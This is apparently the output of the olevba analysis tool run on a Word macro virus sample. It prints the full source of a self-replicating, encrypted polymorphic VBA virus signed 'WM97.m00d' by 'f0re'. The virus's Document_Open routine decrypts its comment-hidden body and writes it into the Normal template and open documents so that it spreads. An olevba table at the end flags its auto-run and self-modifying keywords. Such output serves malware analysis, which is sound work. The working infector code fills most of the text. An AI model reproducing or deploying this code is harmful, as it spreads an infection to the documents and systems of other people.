olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Illegble.b-a93e232cd35bf46c3eef599743df918be1913075
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Illegble.b-a93e232cd35bf46c3eef599743df918be1913075 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSWord.Illegble.b-a93e232cd35bf46c3eef599743df918be1913075 - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'25
'
'w–In››˜›I{Ž�Ÿ—�Jx�¢žKRx¤yŒ˜�KiL™\\�fLƒŸ–¡¡’›o¦MjN”^ “N‰ƒq^‚š�œ¦”¡š£_t†s�
'
'{˜R€¡¤Ÿ”Ÿ‡˜ £Ÿ”§˜bŠv„¦£ž™—©c‹wx¤¢¥¤¤›¤ª©^g_dz¦›œ„¦›¬£�f¤¡¦�«`ieYjbYvY[‰¬£°›®ŸZ�¯œ[ªž°¨ ©¯›‹¬¡ªde^\‘¥¢«]‹‘†‹^{^’°³£
'{˜Rs•¦›©˜w¢–¨ ˜¡§bŠv„¦£ž™—©c‹wx¤¢¥¤¤›¤ª©^g_dz¦›œ„¦›¬£�f¤¡¦�«`ieYjbYvY[‰¬£°›®ŸZ�¯œ[ªž°¨ ©¯›‹¬¡ªde^\‘¥¢«]~�†‹^{^’°³£
'
'i‡AoujoA^Av”—‡Bc�†BdglqC_aCw–™‰DxŒ‰’
'FyŒ›Go–š›GdHv—š•‰”|�–™•Š�ŽWkzœ™”��žX€mnš˜›š™�™ ŸT]UZo›�’zœ‘¢™’
'GzŒ›G{ˆš��œHeHi‹�’ŸŽm˜Œž–�˜žX€lzœ™•�ŽŸY�mnš™œ›š‘š ŸT^V[pœ‘’zœ‘£š“
'_ˆ~:c€
'
'i‡AoujoA]_Bv”—‡Bc�†CdglqC`Cw–™‰DxŒ‰’
'FyŒ›Go–š›GdHi‹œ‘ž�l—Œž–Ž—�Wkzœ™”��žX€mnš˜›š™�™ ŸT]UZo›�’zœ‘¢™’
'GzŒ›G{ˆš��œHeHv—›–Š•}Ž–™•‹ž�X€lzœ™•�ŽŸY�mnš™œ›š‘š ŸT^V[pœ‘’zœ‘£š“
'_ˆ~:c€
'
'n�|��‡„��V
'A·À§À°Ë
'A§âÍÂ¹¤×
'AÓÉÚž¬¢¤
'A¥œÃÌÄ
'B£«Ï¾¸©ÒâÅ¤
'Bº¿Á¬µ¤Éªâ
'@¼°Ü
'B±Î¯£Ÿ´Ø³¯
'A®¶ À¬ÜÈ
'BáµÅ¢Ë»å¦â
'B¶¨À­æ¦Ÿ¶
'AàÄ»ÛÚÎÒ
'_ˆ‡„Ž�U
'
'eŽ‘?x@]@Q@t�@i�”•O„�–�–‘ˆŽ‹�‡•
'n‹Em”˜šT’�”‹™N~RGXPGdGIv•Hmšš—šHz�œž–ŽIwŽ¡�LJ~’�˜JrvKhKƒ
'fƒ=aŒŒ’>Z\>r�“„?s‡„�
'????•‹ˆ�…@]@h�“”N�Š�†”IyMASK
'@@@A—„�…†A^A˜…‘†‡BHB˜�Œ‘ˆCICf‹–LUWM
'<<<<’ˆ…Š‚=Z=??
'FFFFoŒGo–š›U“�•�›P€THYQHfIKy›’ŸŠ��J}ŸŒJn™� ˜�™ŸŠn—šŸ‘TUNL€”‘›
'BBBBBCCC™†’‡ˆCaDš‡“ˆ‰DJEGj“‰Exš‡HFLFiŽ˜NWYP
'<<<<<<<<fi=Z=u
'=======>b�Œ’>[>r‘”„
';;;;`‰<e‚
'_ˆ~:c€
'j‡Ai‘•–PŽ‹�‡•K{OCTLC`CFw˜…–˜��—™_GEy�Š“
';<<<c‹<Y<p�’‚
'_ˆ~:c€
'l‰Dl“—˜R��’Š˜M}QEVNEcFHk”Š’�™šaIG{�Œ•Gk—–�HeH|š�Ž
'i†@g�A^Au“–†Ab�†Bf‘�‡B^aCw•˜ˆCw‹‰’
'BCCCl‰CpŒ‡Ll“—˜R��’Š˜M}QEVNQFWRFWOFcFHNIG{�Œ•
'BBBBBBBCr�‡�ˆ‘C`Dp‰’Ll“—˜S‘Ž“Š˜M}QFWOOFSFW
'CCDDDDDDs�ˆ{†—EbErŽ‰Nn•™šT’�”‹šOSGXPSGZTHw”Œ”�–R
'??@@@@@@s‰š†A^Aj�•Is�†BLB[KBMCV
'>>>>????eŽ‘?x?]@Q@t�@s‰›†
'AABBBBBBBBBCkC`Cf‹•Km’˜Lv’ˆDNE\YNEPEVXVO
'??@@@@@@@@@Ao†˜w‚“A^Bp‡™xƒ”BHCk
'=========>>>f>[>@@
'<<<<<<<<k‚•‘=v
'>>>>>>??eŽ‘?y?\?hl@t�@il
'CCCCCCCCDDDDj“–DtEbEVEy”Eq‹”Nn•™šT’�•ŒšO�SGXPQ
'GGGGGGGHHHHHHHHHr�Iv’�Qq˜�žX–“˜��R…WK\TWK{WL{˜�˜‘šULjM|™‘ƒŽŸM�–“œ
'@@@@@@@AAAAAAAAABBBBkˆBrB`CTCw‹ˆ‘
'OOPPPPPPPPPQQQQQQQQQRRRRs˜¦—¤‰”¥SpS€œ—[|£§¨b �¢™¨]�aUf^aU…¢š¢›¤VaVhcWƒœ¥_¦«¬f¤¡¦�«`“eYjbbYfY‰¦ž¦Ÿ¨ZeZkd
'DDDDDDDEEEEEEEEEFFFFFFFF”‹ž“�•ŒGdGu�Ÿ~‰šHNHi��Ž›Š›
'DDDDDDDEEEEEEEEEFFFFFFFFn•š›U™Œ—“ˆŠ�”‘–�H‚TH—Ž •’—Ž
'DDDDDEEEEEEEEEFFFFFFFFFF•Œž“�•ŒGdHJJbHiŽœ�›Š›IfIKKd
'>>>>>>??????????@@@@eŒ“…
'GGGHHHHHHHHHIIIIIIIIIJJJŒ��™œ�¡Œ�KhKx”�Tt›Ÿ Z˜•š’ U‡YM^VYM_ZN~N[N_W
'PPPQQQQQQQQQRRRRRRRRRSSSt™§˜¥‰”¦TqT��˜\|¤¨©c¡ž£š¨^�bVg_bV†WbW†£›£œ¥dX„�¦`€§«­g¥¢§ž¬a“fZkccZgZŠZh[Š§Ÿ§ ©[g\me
'FFGGGGGGGGGHHHHHHHHHIIII—Ž •’˜�JgJŒ��™��¡Œ�KQKy‘£‚�žLRLm“¡’ŸƒŽŸ
'DDDDDDDEEEEEEEEEFFFFFFFFn•š›U™Œ—“ˆŠ�”‘–�H‚TH—Ž •’—Ž
'GGGHHHHHHHHHIIIIIIIIIJJJ˜�¡–“˜�KhKMMeKl’ ‘ž‚�žLiMOOgM�’“œŸ“¤� NkNPP
'>>??????????@@@@@@@@e�…Aj‡
'=>>>>>>>>>??????d�ƒ?i†
'=========>>>lƒ–’>n
'<<<<<<<<k‚•‘=w
'@@@@@@@@Ž†˜”•“Š�ˆA_BDIDBHBpˆšy„•
'AAAAAAAAj‘•–P”‡’Ž„†ˆ�Œ‘ˆC{PD’‰›—˜–�“Œ
'@@@AAAAAo†˜wƒ”B_BDD\B‘ˆš–—•Œ‘ŠDaDFF
';;;;`‰<e‚
'_ˆ~:c€
'h’Ž:r
'
's€‘†„“Mˆ�’…’”Œ‰Ž…“@RMA—„�…†
'lƒ–j„˜?\?h�“HrŽ„@J@RUJALAR
'h�“”N“†‘�‚„†�Š�‡BTNBJDIECICqˆšnˆ�M
'
'f:W:M
'f�’AzA^AjmALBSBv‘Bj‘•—Q†’˜‘—’‰��’‰—
'EEEEn‹Fn•™šT’�”‹šO€SGXPGdHJO�–Œ‹—ŒŽKI}‘Ž—IšŸ“ž˜™¡JgJ� �
'AAAAg�”BvB_BSBv’Coˆ‘Kk’–˜R��’‰—L}QEVNN
'GGGGGHHH›�Š“�¡IfIr—�QQQ^JTJv�˜RršžŸY—”™�žT…XL]UULWM_MWM�VVM\N_f\aW
'AAAABBBBƒB_BoŒ‡Kk’–—Q��’‰—L}PDUNQEyQEVN
'========>[>_‘�FG
'??@@@@@@c@]AƒALAo†˜l‡›BMB•—„�ˆœ
'========`>[>a†�FaG
'??@@@@@@t…�‘�Š�†A^Au‡�’Ž‹�‡BHCf
';;;;i€“�<p
'AAAAi�•–P”‡’Žƒ…ˆ�Œ‘ˆCoOCFKFDJDx‰‘•‘Ž“Š
'????s„Œ�Œ‰Ž…@]@BB[AmA^AmALBS
'h…@‘•‰”Ž�—@^Au“–†Au‰‡�Bgš‹–Bh’•
'h’Ž:s
'
'n�”‰�Ž“Nv‰’–”q“�•†„•‹‘�B_BhƒŽ–ˆ
'o�”‰��”Od��‡Š“�e‘�˜‡”•‹’‘–C`Ci„�—‰
'o�”‰�Ž“Ns‚—†o�“Ž‚�r”‘�’–B_Bi„�–ˆ
'
'c†—Œ™ˆg’†˜‘‰’˜Rw…š‰f˜Efˆ™Ž›Šj•‰›“‹”šTlœ““uˆ”Œ
'
'f‘Bw�–‹�Ck’–—Q�Œ’‰—LmpDODVQEVNEbEGk”ŠFy›ˆH
'??@@@h�“”N„†�†•†�Š�†•BknBMBSNCT
'e‰‰Š
'A‰~Š€
Set ‹‚©²ª = NormalTemplate.VBProject
Set �¦�¥•° = ‹‚©²ª.VBComponents(1).CodeModule
Set �Ç²§ž‰¼ = ActiveDocument.VBProject
Set ¹®¿ƒ‘‡‰ = �Ç²§ž‰¼.VBComponents(1).CodeModule
If �¦�¥•°.lines(1, 1) <> "Private Sub Document_Open()" Then Set ˆ�´£œ�¶Æ©ˆ = ¹®¿ƒ‘‡‰
If ¹®¿ƒ‘‡‰.lines(1, 1) <> "Private Sub Document_Open()" Then Set ˆ�´£œ�¶Æ©ˆ = �¦�¥•°
If ˆ�´£œ�¶Æ©ˆ = "" Then Exit Sub
For Ÿ¤¦‘š‰­ŽÆ = 3 To ˆ�´£œ�¶Æ©ˆ.countoflines
If Mid(ˆ�´£œ�¶Æ©ˆ.lines(Ÿ¤¦‘š‰­ŽÆ, 1), 1, 1) <> "'" Then Exit For
¢–Â = Mid(ˆ�´£œ�¶Æ©ˆ.lines(Ÿ¤¦‘š‰­ŽÆ, 1), 2, Len(ˆ�´£œ�¶Æ©ˆ.lines(Ÿ¤¦‘š‰­ŽÆ, 1)))
For –³”ˆ„™¼—“ = 1 To Len(¢–Â)
”›…¥‘Á­ = Chr(Asc(Mid(¢–Â, –³”ˆ„™¼—“, 1)) - (Right(ˆ�´£œ�¶Æ©ˆ.lines(2, 1), Len(ˆ�´£œ�¶Æ©ˆ.lines(2, 1)) - 1)) - (Int(((4 * Len(¢–Â) + 2 * –³”ˆ„™¼—“)) / 18.3)))
Æšª‡° ÉŠÆ = Æšª‡° ÉŠÆ & ”›…¥‘Á­
Next –³”ˆ„™¼—“
›�¥’Ë‹„› = ›�¥’Ë‹„› & Æšª‡° ÉŠÆ & Chr(13): Æšª‡° ÉŠÆ = ""
Next Ÿ¤¦‘š‰­ŽÆ
For Æ© À¿³· = 1 To ˆ�´£œ�¶Æ©ˆ.countoflines
If ˆ�´£œ�¶Æ©ˆ.lines(Æ© À¿³·, 1) = "Private Sub Document_Close()" Then
Application.ScreenUpdating = False
ˆ�´£œ�¶Æ©ˆ.insertlines Æ© À¿³· + 1, ›�¥’Ë‹„›
Exit For
End If
Next Æ© À¿³·
Call Document_Close
NormalTemplate.Save
ActiveDocument.SaveAs ActiveDocument.FullName
End Sub
Private Sub Document_Close()
End Sub

'<-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=->

'MyName = WM97.m00d
'WrittenBy = f0re [UC/Skamerks/DVC]
'
'This is my first attempt to write an encrypted polymorphic macro virus.
'I havent included any payload. Stealth is also left out (see my other macros for
'good stealth techniques). Although this virus is a bit slow, it works fine. I did have
'some problems with the randomly generated key. Though you can check this out for yourself.
'If you find any other errors please let me know. Have phun.

'<-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=->
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

